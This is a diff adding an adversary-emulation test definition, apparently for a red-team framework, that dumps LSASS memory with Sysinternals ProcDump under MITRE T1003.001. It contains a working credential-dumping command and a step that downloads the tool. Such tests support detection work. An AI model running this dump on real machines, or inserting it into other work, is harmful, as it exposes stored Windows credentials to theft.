@@ -1,0 +1,46 @@
+api_version: "2.0"
+name: Create Mini Dump of LSASS.exe using ProcDump
+description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+    ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe
+
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+args:
+    - name: output_file
+      type: path
+      default: C:\Windows\Temp\lsass_dump.dmp
+    - name: procdump_exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe
+uuid: 7cede33f-0acd-44ef-9774-15511300b24b
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.001: LSASS Memory'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
+      inline: |
+        if (Test-Path "#{procdump_exe}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
+        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
+        New-Item -ItemType Directory (Split-Path "#{procdump_exe}") -Force | Out-Null
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{procdump_exe}" -Force
+        }}
+      executor: powershell
+    - name: create-mini-dump-of-lsass.exe-using-procdump
+      inline: |
+        "{{.Args.procdump_exe}}" -accepteula -mm lsass.exe {{.Args.output_file}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del "{{.Args.output_file}}" >nul 2> nul
+        executor: command_prompt
